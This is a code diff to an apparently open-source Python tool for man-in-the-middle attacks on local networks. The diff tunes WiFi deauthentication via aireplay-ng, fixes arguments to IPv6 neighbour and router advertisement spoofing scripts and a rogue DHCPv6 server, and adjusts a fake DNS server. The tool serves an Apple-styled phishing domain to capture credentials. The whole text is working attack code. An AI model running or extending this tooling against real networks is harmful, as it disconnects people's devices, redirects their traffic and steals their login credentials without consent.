@@ -71,7 +71,8 @@ aireply_stop = False
 
 # region Disconnect device
 def disconnect_device(network_interface, ip_address, mac_address,
-                      use_deauth_technique=False, deauth_interface=None, network_channel=None, network_bssid=None):
+                      use_deauth_technique=False, deauth_interface=None, deauth_packets=5,
+                      network_channel=None, network_bssid=None):
 
     if not use_deauth_technique:
         # Start Network conflict creator script
@@ -82,7 +83,7 @@ def disconnect_device(network_interface, ip_address, mac_address,
 
     else:
         # Start WiFi deauth packets sender
-        deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address)
+        deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address, deauth_packets)
 
 # endregion
 
@@ -110,7 +111,7 @@ def make_na_spoof(network_interface, target_mac_address, target_ipv6_address,
     if dns_ipv6_address is not None:
         sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/na_spoof.py --interface ' + network_interface +
                    ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-                   ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip' + dns_ipv6_address + ' --quiet &'],
+                   ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip ' + dns_ipv6_address + ' --quiet &'],
                   shell=True)
     else:
         sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/na_spoof.py --interface ' + network_interface +
@@ -131,8 +132,8 @@ def make_ra_spoof(network_interface, target_mac_address, target_ipv6_address,
     # Start Router Advertise spoofing script
     sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/ra_spoof.py --interface ' + network_interface +
                ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-               ' --gateway_ip ' + gateway_ipv6_address + ' --ipv6_prefix' + prefix +
-               ' --dns_ip' + your_local_ipv6_address + ' --quiet &'],
+               ' --gateway_ip ' + gateway_ipv6_address + ' --ipv6_prefix ' + prefix +
+               ' --dns_ip ' + your_local_ipv6_address + ' --quiet &'],
               shell=True)
 
     # Wait 3 seconds
@@ -174,7 +175,7 @@ def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_gl
 
     # Start DHCPv6 rogue server
     sub.Popen(['python ' + project_root_path + '/Scripts/DHCP/dhcpv6_rogue_server.py --interface ' + network_interface +
-               ' --prefix' + prefix + ' --target_ip ' + target_global_ipv6_address +
+               ' --prefix ' + prefix + ' --target_ip ' + target_global_ipv6_address +
                ' --target_mac ' + target_mac_address + ' --quiet &'],
               shell=True)
 
@@ -185,21 +186,25 @@ def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_gl
 
 
 # region Start DNS server
-def start_dns_server(network_interface, target_mac_address, technique_index, fake_ip_address, fake_ipv6_address):
+def start_dns_server(network_interface, target_mac_address, technique_index,
+                     fake_ip_address, mitm_success_domain):
 
     if technique_index in [1, 2, 3]:
         DnsServer.listen(listen_network_interface=network_interface,
                          target_mac_address=target_mac_address,
                          fake_answers=True,
-                         fake_ip_addresses=[fake_ip_address])
+                         fake_ip_addresses=[fake_ip_address],
+                         disable_ipv6=True,
+                         success_domains=[mitm_success_domain])
 
     if technique_index in [4, 5, 6]:
         DnsServer.listen(listen_network_interface=network_interface,
                          target_mac_address=target_mac_address,
                          fake_answers=True,
                          fake_ip_addresses=[fake_ip_address],
-                         fake_ipv6_addresses=[fake_ipv6_address],
-                         listen_ipv6=True)
+                         listen_ipv6=True,
+                         disable_ipv6=True,
+                         success_domains=[mitm_success_domain])
 # endregion
 
 
@@ -208,7 +213,7 @@ def requests_sniffer_prn(request):
     global aireply_stop
 
     # region Stop aireplay-ng
-    if 'ARP' or 'ICMPv6' or 'DHCP' or 'DHCPv6' or 'DNS' or 'MDNS' in request.keys():
+    if 'DHCP' in request.keys() or 'ICMPv6' in request.keys():
         aireply_stop = True
         Base.kill_process_by_name('aireplay-ng')
     # endregion
@@ -225,7 +230,7 @@ def requests_sniffer(source_mac_address):
 
     # region Start sniffer
     sniff = Sniff_raw()
-    sniff.start(protocols=['ARP', 'IP', 'IPv6', 'ICMPv6', 'UDP', 'DNS', 'MDNS', 'DHCP', 'DHCPv6'],
+    sniff.start(protocols=['ARP', 'IP', 'IPv6', 'ICMPv6', 'UDP', 'DNS', 'DHCP'],
                 prn=requests_sniffer_prn, filters=network_filters)
     # endregion
 
@@ -234,22 +239,21 @@ def requests_sniffer(source_mac_address):
 
 
 # region WiFi deauth packets sender
-def deauth_packets_send(network_interface, network_channel, network_bssid, mac_address):
+def deauth_packets_send(network_interface, network_channel, network_bssid, mac_address, number_of_deauth):
     global aireply_stop
 
     # Start target requests sniffer function
     tm = ThreadManager(2)
     tm.add_task(requests_sniffer, mac_address)
-    sleep(3)
 
     # Set WiFi channel on interface for send WiFi deauth packets
     sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)
 
-    # Start deauth packets numbers = 5
-    deauth_packets_number = 5
+    # Start deauth packets numbers
+    deauth_packets_number = number_of_deauth
     aireply_stop = False
 
-    while deauth_packets_number < 30:
+    while deauth_packets_number < 50:
 
         # Check global variable aireplay_stop
         if aireply_stop:
@@ -333,6 +337,7 @@ if __name__ == "__main__":
                              '2. Send WiFi deauthentication packets\n3. Do not disconnect device after MiTM')
     parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
     parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
+    parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)', default=5)
     parser.add_argument('-f', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                         help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
     parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
@@ -836,7 +841,7 @@ if __name__ == "__main__":
     # region Run DNS server
     Base.print_info("Start DNS server ...")
     TM.add_task(start_dns_server, listen_network_interface, target_mac_address, technique_index,
-                your_ip_address, your_local_ipv6_address)
+                your_ip_address, se_domain)
     # endregion
 
     # region Get network interface gateway IPv6 address
@@ -965,7 +970,7 @@ if __name__ == "__main__":
     # region Disconnect device
     if disconnect:
         disconnect_device(listen_network_interface, target_ip_address, target_mac_address,
-                          deauth, deauth_network_interface, channel, bssid)
+                          deauth, deauth_network_interface, args.deauth_packets, channel, bssid)
     # endregion
 
     # region Check credentials
